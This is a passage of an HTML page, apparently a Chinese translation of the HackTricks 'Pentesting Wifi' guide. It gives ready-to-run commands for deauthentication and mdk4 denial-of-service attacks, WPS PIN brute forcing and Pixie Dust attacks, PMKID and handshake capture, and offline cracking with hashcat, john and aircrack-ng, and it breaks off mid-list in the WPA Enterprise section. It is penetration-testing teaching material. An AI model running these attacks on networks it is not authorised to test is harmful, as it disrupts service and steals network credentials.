<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Pentesting Wifi</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="pentesting-wifi"><a class="header" href="#pentesting-wifi">Pentesting Wifi</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>加入 <a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a> 服务器，与经验丰富的黑客和漏洞赏金猎人交流！</p>
<p><strong>黑客见解</strong><br />
参与深入探讨黑客的刺激与挑战的内容</p>
<p><strong>实时黑客新闻</strong><br />
通过实时新闻和见解，跟上快速变化的黑客世界</p>
<p><strong>最新公告</strong><br />
了解最新的漏洞赏金发布和重要平台更新</p>
<p><strong>今天就加入我们的</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a>，与顶尖黑客开始合作吧！</p>
<h2 id="wifi-基本命令"><a class="header" href="#wifi-基本命令">Wifi 基本命令</a></h2>
<pre><code class="language-bash">ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
</code></pre>
<h2 id="工具"><a class="header" href="#工具">工具</a></h2>
<h3 id="eaphammer"><a class="header" href="#eaphammer">EAPHammer</a></h3>
<pre><code>git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
</code></pre>
<h3 id="airgeddon"><a class="header" href="#airgeddon">Airgeddon</a></h3>
<pre><code class="language-bash">mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
</code></pre>
<p><strong>使用 Docker 运行 airgeddon</strong></p>
<pre><code class="language-bash">docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
</code></pre>
<p>从: <a href="https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux">https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux</a></p>
<h3 id="wifiphisher"><a class="header" href="#wifiphisher">wifiphisher</a></h3>
<p>它可以执行 Evil Twin、KARMA 和 Known Beacons 攻击，然后使用钓鱼模板来成功获取网络真实密码或捕获社交网络凭据。</p>
<pre><code class="language-bash">git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
</code></pre>
<h3 id="wifite2"><a class="header" href="#wifite2"><a href="https://github.com/derv82/wifite2">Wifite2</a></a></h3>
<p>此工具自动化<strong>WPS/WEP/WPA-PSK</strong>攻击。它将自动：</p>
<ul>
<li>设置接口为监控模式</li>
<li>扫描可能的网络 - 并让您选择受害者</li>
<li>如果是WEP - 发起WEP攻击</li>
<li>如果是WPA-PSK</li>
<li>如果是WPS：Pixie dust攻击和暴力破解攻击（注意，暴力破解攻击可能需要很长时间）。请注意，它不会尝试空PIN或数据库/生成的PIN。</li>
<li>尝试从AP捕获PMKID以进行破解</li>
<li>尝试使AP的客户端失去认证以捕获握手</li>
<li>如果有PMKID或握手，尝试使用前5000个密码进行暴力破解。</li>
</ul>
<h2 id="攻击总结"><a class="header" href="#攻击总结">攻击总结</a></h2>
<ul>
<li><strong>DoS</strong></li>
<li>失去认证/解除关联 -- 断开所有人（或特定的ESSID/客户端）</li>
<li>随机假AP -- 隐藏网络，可能使扫描器崩溃</li>
<li>过载AP -- 尝试杀死AP（通常不是很有用）</li>
<li>WIDS -- 玩弄IDS</li>
<li>TKIP, EAPOL -- 一些特定的DoS攻击针对某些AP</li>
<li><strong>破解</strong></li>
<li>破解<strong>WEP</strong>（多种工具和方法）</li>
<li><strong>WPA-PSK</strong></li>
<li><strong>WPS</strong> PIN "暴力破解"</li>
<li><strong>WPA PMKID</strong> 暴力破解</li>
<li>[DoS +] <strong>WPA握手</strong>捕获 + 破解</li>
<li><strong>WPA-MGT</strong></li>
<li><strong>用户名捕获</strong></li>
<li><strong>暴力破解</strong>凭证</li>
<li><strong>恶意双胞胎</strong>（有或没有DoS）</li>
<li><strong>开放</strong>恶意双胞胎 [+ DoS] -- 有助于捕获强制门户凭证和/或执行局域网攻击</li>
<li><strong>WPA-PSK</strong>恶意双胞胎 -- 如果您知道密码，对网络攻击很有用</li>
<li><strong>WPA-MGT</strong> -- 有助于捕获公司凭证</li>
<li><strong>KARMA, MANA</strong>, <strong>Loud MANA</strong>, <strong>已知信标</strong></li>
<li><strong>+ 开放</strong> -- 有助于捕获强制门户凭证和/或执行局域网攻击</li>
<li><strong>+ WPA</strong> -- 有助于捕获WPA握手</li>
</ul>
<h2 id="dos"><a class="header" href="#dos">DOS</a></h2>
<h3 id="失去认证数据包"><a class="header" href="#失去认证数据包">失去认证数据包</a></h3>
<p><strong>来自</strong> <a href="https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/"><strong>这里</strong>:</a><strong>的描述。</strong></p>
<p><strong>失去认证</strong>攻击是Wi-Fi黑客中一种常见的方法，涉及伪造“管理”帧以<strong>强制断开设备与网络的连接</strong>。这些未加密的数据包欺骗客户端，使其相信它们来自合法网络，从而使攻击者能够收集WPA握手以进行破解或持续干扰网络连接。这种战术因其简单性而令人震惊，广泛使用并对网络安全产生重大影响。</p>
<p><strong>使用Aireplay-ng进行失去认证</strong></p>
<pre><code>aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
</code></pre>
<ul>
<li>-0 表示去认证</li>
<li>1 是要发送的去认证数量（如果需要，可以发送多个）；0 表示持续发送</li>
<li>-a 00:14:6C:7E:40:80 是接入点的 MAC 地址</li>
<li>-c 00:0F:B5:34:30:30 是要去认证的客户端的 MAC 地址；如果省略，则发送广播去认证（并不总是有效）</li>
<li>ath0 是接口名称</li>
</ul>
<h3 id="断开关联数据包"><a class="header" href="#断开关联数据包">断开关联数据包</a></h3>
<p><strong>断开关联数据包</strong>，类似于去认证数据包，是在 Wi-Fi 网络中使用的一种管理帧。这些数据包用于切断设备（如笔记本电脑或智能手机）与接入点（AP）之间的连接。断开关联和去认证之间的主要区别在于它们的使用场景。虽然 AP 发出 <strong>去认证数据包以明确地将流氓设备从网络中移除，断开关联数据包通常在 AP 正在关闭、重启或移动时发送，从而需要断开所有连接的节点。</strong></p>
<p><strong>此攻击可以通过 mdk4（模式 "d"）执行：</strong></p>
<pre><code class="language-bash"># -c &lt;channel&gt;
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
</code></pre>
<h3 id="更多通过-mdk4-的-dos-攻击"><a class="header" href="#更多通过-mdk4-的-dos-攻击"><strong>更多通过 mdk4 的 DOS 攻击</strong></a></h3>
<p><strong>在</strong> <a href="https://en.kali.tools/?p=864"><strong>这里</strong></a><strong>.</strong></p>
<p><strong>攻击模式 b: 信标洪水</strong></p>
<p>发送信标帧以在客户端显示虚假 AP。这有时会使网络扫描仪甚至驱动程序崩溃！</p>
<pre><code class="language-bash"># -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
</code></pre>
<p><strong>攻击模式 a: 认证拒绝服务</strong></p>
<p>向范围内所有可访问的接入点（AP）发送认证帧可能会使这些 AP 过载，尤其是在涉及多个客户端时。这种强烈的流量可能导致系统不稳定，导致一些 AP 冻结或甚至重置。</p>
<pre><code class="language-bash"># -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
</code></pre>
<p><strong>ATTACK MODE p: SSID Probing and Bruteforcing</strong></p>
<p>探测接入点（AP）检查SSID是否正确显示，并确认AP的范围。此技术与<strong>暴力破解隐藏SSID</strong>结合使用，无论是否使用字典，都有助于识别和访问隐藏网络。</p>
<p><strong>ATTACK MODE m: Michael Countermeasures Exploitation</strong></p>
<p>向不同的QoS队列发送随机或重复的数据包可能会触发<strong>TKIP APs</strong>上的Michael对策，导致AP关闭一分钟。此方法是一种有效的<strong>DoS</strong>（拒绝服务）攻击战术。</p>
<pre><code class="language-bash"># -t &lt;BSSID&gt; of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
</code></pre>
<p><strong>攻击模式 e: EAPOL 启动和注销数据包注入</strong></p>
<p>用 <strong>EAPOL 启动帧</strong> 轰炸接入点会创建 <strong>虚假会话</strong>，使接入点不堪重负并阻止合法客户端。或者，注入 <strong>虚假 EAPOL 注销消息</strong> 强行断开客户端，这两种方法都有效地干扰网络服务。</p>
<pre><code class="language-bash"># Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
</code></pre>
<p><strong>攻击模式 s: 针对 IEEE 802.11s 网状网络的攻击</strong></p>
<p>对网状网络中链路管理和路由的各种攻击。</p>
<p><strong>攻击模式 w: WIDS 混淆</strong></p>
<p>将客户端交叉连接到多个 WDS 节点或假冒的恶意 AP 可以操纵入侵检测和预防系统，造成混淆和潜在的系统滥用。</p>
<pre><code class="language-bash"># -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e &lt;SSID&gt; -c &lt;channel&gt; [-z]
</code></pre>
<p><strong>攻击模式 f: 数据包模糊器</strong></p>
<p>一个具有多种数据包来源和全面的数据包操作修改器的数据包模糊器。</p>
<h3 id="airggedon"><a class="header" href="#airggedon"><strong>Airggedon</strong></a></h3>
<p><em><strong>Airgeddon</strong></em> 提供了之前评论中提出的大多数攻击：</p>
<p><img src="../../.gitbook/assets/image%20(95).png" alt="" /></p>
<h2 id="wps"><a class="header" href="#wps">WPS</a></h2>
<p>WPS（Wi-Fi 保护设置）简化了将设备连接到路由器的过程，提高了加密为 <strong>WPA</strong> 或 <strong>WPA2</strong> 个人网络的设置速度和便利性。对于容易被攻破的 WEP 安全性，它是无效的。WPS 使用一个 8 位数字的 PIN，分为两部分进行验证，这使其容易受到暴力破解攻击，因为组合数量有限（11,000 种可能性）。</p>
<h3 id="wps-暴力破解"><a class="header" href="#wps-暴力破解">WPS 暴力破解</a></h3>
<p>执行此操作的主要工具有 2 个：Reaver 和 Bully。</p>
<ul>
<li><strong>Reaver</strong> 被设计为对 WPS 进行强大且实用的攻击，并已针对各种接入点和 WPS 实现进行了测试。</li>
<li><strong>Bully</strong> 是 WPS 暴力破解攻击的 <strong>新实现</strong>，用 C 编写。它相较于原始的 Reaver 代码有几个优点：依赖性更少，内存和 CPU 性能更好，正确处理字节序，以及更强大的选项集。</li>
</ul>
<p>该攻击利用了 <strong>WPS PIN 的漏洞</strong>，特别是前四位数字的暴露和最后一位数字作为校验和的角色，简化了暴力破解攻击。然而，针对暴力破解攻击的防御措施，如 <strong>阻止攻击者的 MAC 地址</strong>，需要 <strong>MAC 地址轮换</strong> 以继续攻击。</p>
<p>在使用 Bully 或 Reaver 等工具获取 WPS PIN 后，攻击者可以推导出 WPA/WPA2 PSK，从而确保 <strong>持续的网络访问</strong>。</p>
<pre><code class="language-bash">reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
</code></pre>
<p><strong>智能暴力破解</strong></p>
<p>这种精细的方法针对使用已知漏洞的WPS PIN：</p>
<ol>
<li><strong>预先发现的PIN</strong>：利用与特定制造商相关的已知PIN数据库，这些制造商已知使用统一的WPS PIN。该数据库将MAC地址的前三个八位字节与这些制造商可能的PIN相关联。</li>
<li><strong>PIN生成算法</strong>：利用像ComputePIN和EasyBox这样的算法，根据AP的MAC地址计算WPS PIN。Arcadyan算法还需要设备ID，为PIN生成过程增加了一层。</li>
</ol>
<h3 id="wps-pixie-dust攻击"><a class="header" href="#wps-pixie-dust攻击">WPS Pixie Dust攻击</a></h3>
<p><strong>Dominique Bongard</strong>发现了一些接入点（AP）在创建秘密代码（称为<strong>nonces</strong>（<strong>E-S1</strong>和<strong>E-S2</strong>））方面的缺陷。如果这些nonces能够被破解，破解AP的WPS PIN就变得容易。AP在一个特殊代码（哈希）中透露PIN，以证明其合法性而不是伪造（恶意）AP。这些nonces本质上是解锁存放WPS PIN的“保险箱”的“钥匙”。更多信息可以在<a href="https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)">这里</a>找到。</p>
<p>简单来说，问题在于一些AP在连接过程中没有使用足够随机的密钥来加密PIN。这使得PIN容易被外部猜测（离线暴力破解攻击）。</p>
<pre><code class="language-bash">reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
</code></pre>
<p>如果您不想将设备切换到监视模式，或者 <code>reaver</code> 和 <code>bully</code> 有一些问题，您可以尝试 <a href="https://github.com/nikita-yfh/OneShot-C">OneShot-C</a>。这个工具可以在不切换到监视模式的情况下执行 Pixie Dust 攻击。</p>
<pre><code class="language-bash">./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
</code></pre>
<h3 id="null-pin-攻击"><a class="header" href="#null-pin-攻击">Null Pin 攻击</a></h3>
<p>一些设计不良的系统甚至允许 <strong>Null PIN</strong>（空的或不存在的 PIN）授予访问权限，这非常不寻常。工具 <strong>Reaver</strong> 能够测试此漏洞，而 <strong>Bully</strong> 则无法。</p>
<pre><code class="language-bash">reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
</code></pre>
<h3 id="airgeddon-1"><a class="header" href="#airgeddon-1">Airgeddon</a></h3>
<p>所有提议的 WPS 攻击都可以轻松地使用 <em><strong>airgeddon.</strong></em></p>
<p><img src="../../.gitbook/assets/image%20(219).png" alt="" /></p>
<ul>
<li>5 和 6 让你尝试 <strong>你的自定义 PIN</strong>（如果你有的话）</li>
<li>7 和 8 执行 <strong>Pixie Dust 攻击</strong></li>
<li>13 允许你测试 <strong>NULL PIN</strong></li>
<li>11 和 12 将 <strong>从可用数据库中收集与所选 AP 相关的 PIN</strong> 并 <strong>生成</strong> 可能的 <strong>PIN</strong>，使用：ComputePIN、EasyBox 和可选的 Arcadyan（推荐，为什么不呢？）</li>
<li>9 和 10 将测试 <strong>每一个可能的 PIN</strong></li>
</ul>
<h2 id="wep"><a class="header" href="#wep"><strong>WEP</strong></a></h2>
<p>现在已经破损且不再使用。只需知道 <em><strong>airgeddon</strong></em> 有一个名为 "All-in-One" 的 WEP 选项来攻击这种保护。更多工具提供类似的选项。</p>
<p><img src="../../.gitbook/assets/image%20(432).png" alt="" /></p>
<hr />
<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>加入 <a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a> 服务器，与经验丰富的黑客和漏洞赏金猎人交流！</p>
<p><strong>Hacking Insights</strong><br />
参与深入探讨黑客的刺激和挑战的内容</p>
<p><strong>Real-Time Hack News</strong><br />
通过实时新闻和见解，跟上快速变化的黑客世界</p>
<p><strong>Latest Announcements</strong><br />
及时了解最新的漏洞赏金发布和重要平台更新</p>
<p><strong>Join us on</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a> 并立即与顶级黑客合作！</p>
<hr />
<h2 id="wpawpa2-psk"><a class="header" href="#wpawpa2-psk">WPA/WPA2 PSK</a></h2>
<h3 id="pmkid"><a class="header" href="#pmkid">PMKID</a></h3>
<p>在 2018 年，<strong>hashcat</strong> <a href="https://hashcat.net/forum/thread-7717.html">揭示</a> 一种新的攻击方法，独特之处在于它只需要 <strong>一个单一的数据包</strong>，并且不需要任何客户端连接到目标 AP——只需攻击者与 AP 之间的交互。</p>
<p>许多现代路由器在关联期间向 <strong>第一个 EAPOL</strong> 帧添加了一个 <strong>可选字段</strong>，称为 <code>Robust Security Network</code>。这包括 <code>PMKID</code>。</p>
<p>正如原始帖子所解释的，<strong>PMKID</strong> 是使用已知数据创建的：</p>
<pre><code class="language-bash">PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
</code></pre>
<p>鉴于“PMK名称”是恒定的，我们知道AP和站点的BSSID，并且<code>PMK</code>与完整的4次握手中的相同，<strong>hashcat</strong>可以利用这些信息破解PSK并恢复密码短语！</p>
<p>要<strong>收集</strong>这些信息并在本地<strong>暴力破解</strong>密码，您可以执行：</p>
<pre><code class="language-bash">airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
</code></pre>
<pre><code class="language-bash">#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
</code></pre>
<p>捕获的 <strong>PMKIDs</strong> 将显示在 <strong>控制台</strong> 中，并且也会 <strong>保存</strong> 在 _ <strong>/tmp/attack.pcap</strong>_<br />
现在，将捕获的数据转换为 <strong>hashcat/john</strong> 格式并破解：</p>
<pre><code class="language-bash">hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
</code></pre>
<p>请注意，正确的哈希格式包含 <strong>4 部分</strong>，如：<code>4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838</code> 如果您的 <strong>仅</strong> 包含 <strong>3 部分</strong>，那么它是 <strong>无效的</strong>（PMKID 捕获无效）。</p>
<p>请注意，<code>hcxdumptool</code> <strong>也捕获握手</strong>（会出现类似这样的内容：<strong><code>MP:M1M2 RC:63258 EAPOLTIME:17091</code></strong>）。您可以使用 <code>cap2hccapx</code> <strong>将握手</strong> 转换为 <strong>hashcat</strong>/<strong>john</strong> 格式。</p>
<pre><code class="language-bash">tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx &gt; handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
</code></pre>
<p><em>I have noticed that some handshakes captured with this tool couldn't be cracked even knowing the correct password. I would recommend to capture handshakes also via traditional way if possible, or capture several of them using this tool.</em></p>
<h3 id="handshake-capture"><a class="header" href="#handshake-capture">Handshake capture</a></h3>
<p>对<strong>WPA/WPA2</strong>网络的攻击可以通过捕获<strong>handshake</strong>并尝试<strong>crack</strong>密码<strong>offline</strong>来执行。这个过程涉及监控特定网络和特定<strong>channel</strong>上的<strong>BSSID</strong>的通信。以下是简化的指南：</p>
<ol>
<li>确定目标网络的<strong>BSSID</strong>、<strong>channel</strong>和<strong>connected client</strong>。</li>
<li>使用<code>airodump-ng</code>在指定的channel和BSSID上监控网络流量，期望捕获到一个handshake。命令如下：</li>
</ol>
<pre><code class="language-bash">airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
</code></pre>
<ol start="3">
<li>为了增加捕获握手的机会，暂时将客户端从网络中断开，以强制重新认证。这可以使用 <code>aireplay-ng</code> 命令完成，该命令向客户端发送去认证数据包：</li>
</ol>
<pre><code class="language-bash">aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
</code></pre>
<p><em>注意，由于客户端被取消认证，它可能会尝试连接到不同的AP，或者在其他情况下，连接到不同的网络。</em></p>
<p>一旦在 <code>airodump-ng</code> 中出现一些握手信息，这意味着握手已被捕获，您可以停止监听：</p>
<p><img src="../../.gitbook/assets/image%20(172)%20(1).png" alt="" /></p>
<p>一旦握手被捕获，您可以使用 <code>aircrack-ng</code> <strong>破解</strong> 它：</p>
<pre><code>aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
</code></pre>
<h3 id="检查文件中的握手"><a class="header" href="#检查文件中的握手">检查文件中的握手</a></h3>
<p><strong>aircrack</strong></p>
<pre><code class="language-bash">aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
</code></pre>
<p><strong>tshark</strong></p>
<pre><code class="language-bash">tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
</code></pre>
<p><a href="https://github.com/roobixx/cowpatty"><strong>cowpatty</strong></a></p>
<pre><code>cowpatty -r psk-01.cap -s "ESSID" -f -
</code></pre>
<p><em>如果这个工具在完成的握手之前找到一个ESSID的未完成握手，它将无法检测到有效的握手。</em></p>
<p><strong>pyrit</strong></p>
<pre><code class="language-bash">apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
</code></pre>
<h2 id="wpa-enterprise-mgt"><a class="header" href="#wpa-enterprise-mgt"><strong>WPA Enterprise (MGT)</strong></a></h2>
<p>在<strong>企业WiFi设置中，您将遇到各种认证方法</strong>，每种方法提供不同的安全级别和管理功能。当您使用工具如<code>airodump-ng</code>检查网络流量时，您可能会注意到这些认证类型的标识符。一些常见的方法包括：</p>
<pre><code>6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
</code></pre>
<ol>
<li><strong>EAP-GTC (通用令牌卡)</strong>:</li>
</ol>
<ul>
<li>此方法支持硬件令牌和一次性密码在 EAP-PEAP 中。与 MSCHAPv2 不同，它不使用对等挑战，并以明文形式将密码发送到接入点，存在降级攻击的风险。</li>
</ul>
<ol start="2">
<li><strong>EAP-MD5 (消息摘要 5)</strong>:</li>
</ol>
<ul>
<li>涉及从客户端发送密码的 MD5 哈希。由于对字典攻击的脆弱性、缺乏服务器认证以及无法生成会话特定的 WEP 密钥，因此<strong>不推荐</strong>使用。</li>
</ul>
<ol start="3">
<li><strong>EAP-TLS (传输层安全)</strong>:</li>
</ol>
<ul>
<li>利用客户端和服务器端证书进行认证，并可以动态生成基于用户和会话的 WEP 密钥以保护通信。</li>
</ul>
<ol start="4">
